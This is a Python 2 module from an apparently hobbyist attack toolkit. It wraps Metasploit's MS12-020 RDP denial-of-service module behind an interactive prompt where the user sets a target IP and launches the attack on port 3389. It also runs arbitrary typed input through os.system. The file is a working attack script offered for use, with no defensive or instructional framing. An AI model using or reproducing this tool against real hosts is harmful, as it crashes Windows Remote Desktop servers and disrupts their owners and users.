'''
Module for Remote Desktop Exploit With Metasploit Framework
Created by ~xGans
Facebook : https://web.facebook.com/ichsan.AndroSec
Gmail : Exsandrrt01@gmail.com
you can report bug on my email
'''
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import subprocess
from core import wcolors
from core import help
from time import sleep
from core import log
from core import about
options = ["192.168.1.3"]
def rdpexploit():
	try:
		line_1 = wcolors.color.RED + "[" + wcolors.color.CYAN + "XioChi" + wcolors.color.RED + "]" +  wcolors.color.ENDC
		line_1 += wcolors.color.RED + "[" + wcolors.color.CYAN + "exploit/remote_desktop" + wcolors.color.RED + "]>> " + wcolors.color.ENDC
		com = raw_input(line_1)
		if com[0:10] =='set target':
			target_ip = com[11:40]
			options[0] = target_ip
			print wcolors.color.RED + "[" + wcolors.color.CYAN + "Target" + wcolors.color.RED + "]>> " + options[0]
			rdpexploit()
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t RQ\t Description"
			print "---------\t--------------\t\t----\t--------------"
			print "TARGET\t\t"+options[0]+"\t\tyes\tTarget IP Address"
			rdpexploit()
		elif com[0:2] =='os':
			log.logger.single("Command Executed", "\n"+wcolors.color.CYAN)
			os.system(com[3:])
			rdpexploit()
		elif com[0:4] =='help':
			help.help()
			rdpexploit()
		elif com[0:4] =='back':
			pass
		elif com[0:5] =='about':
			about.about()
			rdpexploit()
		elif com[0:3] =='run':
			log.logger.attack("Attacking")
			subprocess.Popen('msfconsole -x "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOST %s; set RPORT 3389; exploit; exit"' %options[0], shell=True).wait()
			rdpexploit()
		else:
			print wcolors.color.RED + "[" + wcolors.color.CYAN + "Wrong Command" + wcolors.color.RED + "]>>" + com
			rdpexploit()
	except(KeyboardInterrupt):
		print ""
